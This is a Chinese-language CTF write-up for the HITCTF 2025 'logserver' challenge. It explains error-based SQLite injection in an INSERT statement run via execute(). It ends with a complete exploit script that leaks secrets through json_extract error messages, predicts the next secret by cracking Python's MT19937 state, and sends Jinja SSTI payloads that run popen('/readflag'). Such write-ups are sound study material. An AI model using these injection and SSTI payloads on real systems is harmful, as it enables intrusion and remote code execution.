---
layout: post
title: HITCTF 2025 logserver 详解——SQLite execute() 场景下的错误注入
date: 2025-12-14
categories: [CTF]
tags: [CTF, write-up, SQL注入, SQLite, 错误注入, SSTI, HITCTF]
toc: true
author: GyroJ
---

这个题目真的把我坑惨了，本来看见一个random和明显的SSTI，没有什么过滤，以为稳了，本地也打过了，远程死活打不过，根本原因是出题人给的源码实际上是错误的，远程服务器上运行的是`execute()`而不是 `executescript()`，不支持堆叠查询导致我只能拿到1bit的secret`(payload = f"CASE WHEN (substr(secret,1,1)='a') THEN abs(-9223372036854775808) ELSE 'ok' END")`。于是我走上了一条错误的道路，我使用每次泄露的1bit强行使用z3库恢复内部状态，最终失败(这实在是过度愚蠢了）。这是简单题，我大意坠机了，出题人你真是太baby了...

# SQLite `execute()` 场景下的错误注入原理解析


> **为什么在源码使用的是 `execute()`（而不是 `executescript()`）的情况下，
> UNION / stacked query 等方式不可行，但 error-based SQL 注入却仍然可以成功？**

## 源码回顾

```python
conn.execute(
    f"INSERT INTO logs (message) VALUES ('{message}')"
)
```

### SQL 的原始结构是：

```sql
INSERT INTO logs (message)
VALUES ('用户输入')
```

攻击者 **只能控制 `VALUES()` 内部的表达式**，
而不能改变 SQL 的整体结构。

---

## 为什么 stacked query 在 `execute()` 下行不通？

### 1. stacked query 的基本形式

```sql
'; SELECT secret FROM secret; --
```

### 2. SQLite `execute()` 的行为

* `execute()` **只允许执行一条 SQL 语句**
* 遇到分号后的第二条语句：

```text
sqlite3.ProgrammingError: You can only execute one statement at a time
```

### 3. 结论

> **任何依赖 `;` 的注入方式都会被 `execute()` 阻断**

这也是很多人第一时间失败的原因。

---

## 为什么 UNION-based 注入也不可行？

### 1. UNION 的前提条件

```sql
SELECT col FROM table
UNION SELECT other_col
```

### 2. 当前 SQL 是什么？

```sql
INSERT INTO logs (message) VALUES (...)
```

这是一个：

* 非 SELECT
* 没有结果集返回给用户

### 3. 即使写成

```sql
' UNION SELECT secret FROM secret --
```

也会导致：

```text
syntax error near UNION
```

### 4. 结论

> **UNION 注入只能用于 SELECT 型 SQL，
> 在 INSERT 场景天然失效。**

---

## 为什么布尔注入 / 时间盲注也很难？

### 1. 布尔注入依赖差异化响应

```sql
AND 1=1
AND 1=2
```

### 2. 当前场景的问题

* INSERT 成功 → success
* INSERT 失败 → error

没有：

* 页面内容差异
* 可控延迟（SQLite 无 sleep）

于是我们强行使用一种愚蠢的方式：
`payload = f"CASE WHEN (substr(secret,1,1)='a') THEN abs(-9223372036854775808) ELSE 'ok' END"`
强行盲注，花很久的时间才能拿到1bit的secret

---

## 为什么 error-based 注入却"刚好可行"？

### 关键原因：

> **`execute()` 允许在"单条 SQL 语句中”使用任意合法表达式和子查询**

而 SQLite 的 JSON 函数：

* 会解析参数
* 会在失败时抛出异常
* 异常信息中会携带"非法参数值"

---

## 错误注入 Payload 的本质结构

```sql
' || error_function( (SELECT secret FROM secret) ) || '
```

### 满足所有限制：

| 限制          | 是否满足 |
| ----------- | ---- |
| 单条 SQL      | ✅    |
| 无分号         | ✅    |
| 无 UNION     | ✅    |
| INSERT 语句合法 | ✅    |

📌 **这正是 error-based SQLi 的优势**

---

## 为什么 `json_extract` 是"完美载体"？

### SQLite 的特性：

```sql
json_extract(json, path)
```

* `path` 必须是 JSON Path
* 非法时：

```text
JSON path error near 'xxx'
```

并且：

* `xxx` 是 **原始传入值**
* 不做脱敏
* 不截断

当 `xxx = (SELECT secret FROM secret)` 时：

➡️ **完整 secret 被带入错误信息**

---

## execute() vs executescript() 的本质区别（对比）

| 特性   | execute | executescript |
| ---- | ------- | ------------- |
| 多语句  | ❌       | ✅             |
| 分号   | ❌       | ✅             |
| 子查询  | ✅       | ✅             |
| 错误回显 | ✅       | ✅             |

📌 **execute 不是"安全版 executescript"**

---

剩下的部分不详细介绍了，也就是梅森旋转算法的状态恢复、预测，我之前的博客有，还有就是一个简单的SSTI。下面是exp

```python
import requests
import re
import random
from randcrack import RandCrack 


BASE_URL = ""
LOG_URL = f"{BASE_URL}/log"
BACKDOOR_URL = f"{BASE_URL}/backdoor"

PAYLOAD = {
    "message": "' || json_extract('{}', (SELECT secret FROM secret)) || '"
}

def get_leaked_secret():
    """发送请求并从报错中提取 secret (修正正则版)"""
    try:
        r = requests.post(LOG_URL, json=PAYLOAD)
        match = re.search(r"JSON path error near '([0-9a-f]+)'", r.text)
        
        if not match:
             match = re.search(r"bad JSON path: '([0-9a-f]+)'", r.text)

        if match:
            return match.group(1)
        else:
            print(f"[-] 未找到 secret，响应内容: {r.text}")
            return None
    except Exception as e:
        print(f"[-] 请求异常: {e}")
        return None

def solve():
    print("[*] 开始收集随机数样本以还原 MT19937 状态...")
    
    rc = RandCrack()
    
    collected_secrets = []
    
    for i in range(208):
        hex_secret = get_leaked_secret()
        if not hex_secret:
            continue
            
        print(f"\r[+] 进度: {i+1}/208 - 获取 secret: {hex_secret[:10]}...", end='')
        
        secret_int = int(hex_secret, 16)
        
        chunk1 = secret_int & 0xFFFFFFFF            
        chunk2 = (secret_int >> 32) & 0xFFFFFFFF    
        chunk3 = (secret_int >> 64) & 0xFFFFFFFF   
        
        try:
            rc.submit(chunk1)
            rc.submit(chunk2)
            rc.submit(chunk3)
        except ValueError:
            pass

    print("\n[*] 样本收集完毕，尝试预测下一个 Secret...")

    predicted_int = rc.predict_getrandbits(96)
    
    predicted_bytes = predicted_int.to_bytes((predicted_int.bit_length() + 7) // 8, byteorder='big')
    predicted_secret = predicted_bytes.hex()
    
    print(f"[+] 预测的 Secret: {predicted_secret}")
    
    # --- 发送后门 Payload ---
    print("[*] 尝试利用 Backdoor 读取 Flag...")
    
    ssti_code = "{{ ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['popen']('/readflag').read() }}"
    ssti_code_safe = """
    {% for x in ().__class__.__base__.__subclasses__() %}
        {% if "warning" in x.__name__ %}
            {{ x()._module.__builtins__['__import__']('os').popen('/readflag').read() }}
        {% endif %}
    {% endfor %}
    """

    data = {
        "secret": predicted_secret,
        "code": ssti_code_safe
    }
    
    res = requests.post(BACKDOOR_URL, json=data)
    
    if "success" in res.text and res.json().get("success"):
        print("\n[!!!] 攻击成功！Flag 内容如下：")
        print("-" * 30)
        print(res.json().get("result").strip())
        print("-" * 30)
    else:
        print("\n[-] 攻击失败，预测的 secret 可能不对，或者 SSTI payload 有问题。")
        print("Server Response:", res.text)

if __name__ == "__main__":
    solve()
```

